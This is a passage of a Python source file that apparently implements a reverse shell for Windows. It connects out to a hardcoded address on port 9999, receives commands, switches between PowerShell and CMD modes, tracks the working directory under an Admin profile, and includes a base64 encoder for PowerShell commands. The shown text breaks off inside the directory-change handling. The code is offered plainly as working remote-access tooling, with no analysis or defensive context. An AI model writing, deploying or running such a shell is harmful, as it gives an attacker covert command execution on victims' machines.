import socket
import subprocess
import os
import base64

HOST = '192.168.50.39'
PORT = 9999

mode = "ps"
cwd = os.path.expanduser("C:\\Users\\Admin")  # default directory

def encode_powershell_command(cmd: str) -> str:
    cmd_bytes = cmd.encode('utf-16le')
    return base64.b64encode(cmd_bytes).decode('ascii')

def get_prompt():
    global cwd
    if mode == "ps":
        try:
            prompt_path = subprocess.check_output(
                ["powershell.exe", "-NoProfile", "-Command", "Get-Location"],
                stderr=subprocess.STDOUT,
                text=True,
                cwd=cwd
            ).strip()
            cwd = prompt_path
            return f"{prompt_path}> "
        except Exception:
            return f"{cwd}> "
    else:
        try:
            prompt_path = subprocess.check_output(
                "cd",
                shell=True,
                text=True,
                cwd=cwd
            ).strip()
            cwd = prompt_path
            return f"{prompt_path}> "
        except Exception:
            return f"{cwd}> "

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT))

    while True:
        data = s.recv(4096)
        if not data:
            break
        command = data.decode().strip()

        if command == 'lsw ps':
            mode = "ps"
            s.sendall(b"[LSW] Switched to PowerShell mode.\n")
            continue
        elif command == 'lsw cmd':
            mode = "cmd"
            s.sendall(b"[LSW] Switched to CMD mode.\n")
            continue

        try:
            if command.lower().startswith("cd"):
                parts = command.split(maxsplit=1)
                if len(parts) == 2:
                    new_path = parts[1].strip('"').replace("/", "\\")
                    if new_path == "..":
                        cwd = os.path.dirname(cwd)
                    else:
